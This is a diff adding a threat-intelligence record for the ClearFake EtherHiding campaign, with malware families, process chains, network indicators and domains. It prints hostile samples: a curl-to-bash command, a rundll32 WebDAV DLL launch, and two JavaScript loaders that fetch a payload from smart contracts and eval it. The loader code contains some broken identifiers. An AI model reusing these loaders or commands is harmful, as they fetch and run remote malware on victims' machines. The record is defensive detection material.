@@ -1,0 +1,92 @@
+title: 'Smart Contracts for C&C: How ClearFake Hid in Plain Sight on BSC Testnet'
+description: Threat actors used the EtherHiding technique to store ClearFake payload
+  routing instructions inside BNB Smart Chain testnet smart contracts, delivering
+  SectopRAT and ACRStealer to victims via a ClickFix social engineering overlay with
+  OS-specific routing and on-chain execution tracking.
+attribution: ''
+malware_families:
+- ClearFake
+- SectopRAT
+- ACRStealer
+cves: []
+ttps:
+  processes:
+  - pythonw.exe
+  - rundll32.exe
+  - dllhost.exe
+  - chrome.exe
+  - msedge.exe
+  - vlc.exe
+  - microsoftedge.exe
+  - firefox.exe
+  - iexplore.exe
+  - opera.exe
+  - brave.exe
+  - vivaldi.exe
+  - waterfox.exe
+  command_lines:
+  - /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '[URL]')"
+  - rundll32.exe \\<WebDAV server>\<share name>\<malicious DLL>\, <exported function>
+  powershell: []
+  scripts:
+  - helper.py
+  - 'async function load_(contractAddress) { const rpcRequest = { method: eth_call,
+    params: [ { to: contractAddress, data: ''0x6d4ce63c'' }, latest ], id: 97, jsonrpc:
+    2.0 }; const response = await fetch(''https://bsc-testnet-rpc.publicnode.com/'',
+    { method: POST, headers: { Accept: application/json, Content-Type: application/json
+    }, body: JSON.stringify(rpcRequest) }); const resultHex = (await response.json()).result.slice(2);
+    const bytes = new Uint8Array( resultHex.match(/[\da-f]{2}/gi).map(b => parseInt(b,
+    16)) ); const metaLen = Number(toHex(bytes.slice(0, 32))); const strLen = Number(toHex(bytes.slice(32,
+    32 + metalen))); const payload = String.fromCharCode.apply(null, bytes.slice(32
+    + metalen, 32 + metalen + strlien) ); return payload; } load_("0xA1decFB75C8CACA28C10517ce56B718baf727d2e")
+    .then(result => eval(atob(result))) .catch(() => {});'
+  - async function load_(address){let uint8ArrayToHexString=t=>{let e="0x";for(const
+    a of t){constt=a.toString(16);e+=1===t.length? 0${t} :t}return e};_data={method:"eth_call",params:[{to:address,data:"0x6d4ce63c"},"latest"],id:97,jsonrpc:"2.0"},_config={method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(_data)},url="https://bsc-testnet-rpc.publicnode.com",response=await
+    fetch(url,_config),answer=(await response.json()).result.slice(2),unhexed=new
+    Uint8Array(answer.match(/[\da-f]{2}/gi).map((function(t){return parseInt(t,16)}))),offset=Number(uint8ArrayToHexString(unhexed.slice(0,32))),len=Number(uint8ArrayToHexString(unhexed.slice(32,32+offset))),value=String.fromCharCode.apply(null,unhexed.slice(32+offset,32+offset+len)),eval(atob(value))}isWindows?load_("0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff"):isMac&&load_("0x68DCcE15C1002a2689E19D33A3aE509DD1FEb11A5");
+  registry_keys: []
+  image_loads:
+  - libvlc.dll
+  - libvlccore.dll
+  - put34b.camp
+  network_connections:
+  - dllhost.exe -> api.github[.]com
+  - dllhost.exe -> registry.npmjs[.]org
+  - dllhost.exe -> pypi[.]org
+  - dllhost.exe -> download2324.mediafire[.]com
+  - browser -> hxxps://bsc-testnet-rpc.publicnode[.]com/
+  - browser -> ip-info.ff.avast[.]com/v2/info
+  - browser -> mc.yandex[.]ru/metrika/tag.js
+  - chrome.exe -> bsc-testnet-rpc.publicnode[.]com:443
+  - msedge.exe -> bsc-testnet-rpc.publicnode[.]com:443
+  - firefox.exe -> bsc-testnet-rpc.publicnode[.]com:443
+  - rundll32.exe -> bsc-testnet-rpc.publicnode[.]com:443
+  file_activity:
+  - helper.py
+  persistence: []
+  process_relations:
+  - rundll32.exe -> chrome.exe
+  - rundll32.exe -> msedge.exe
+  - rundll32.exe -> dllhost.exe
+  - dllhost.exe -> pythonw.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - bsc-testnet-rpc.publicnode[.]com
+  - ip-info.ff.avast[.]com
+  - mc.yandex[.]ru
+  - download2324.mediafire[.]com
+  - api.github[.]com
+  - registry.npmjs[.]org
+  - pypi[.]org
+  - put34b.camp
+  urls:
+  - hxxps://bsc-testnet-rpc.publicnode[.]com/
+  - ip-info.ff.avast[.]com/v2/info
+  - mc.yandex[.]ru/metrika/tag.js
+authors:
+- TrendAITM Research
+reference: https://www.trendmicro.com/en_us/research/26/e/smart-contracts-for-command-and-control.html
+date_of_publication: May 26, 2026
+file_creation_date: May 26, 2026
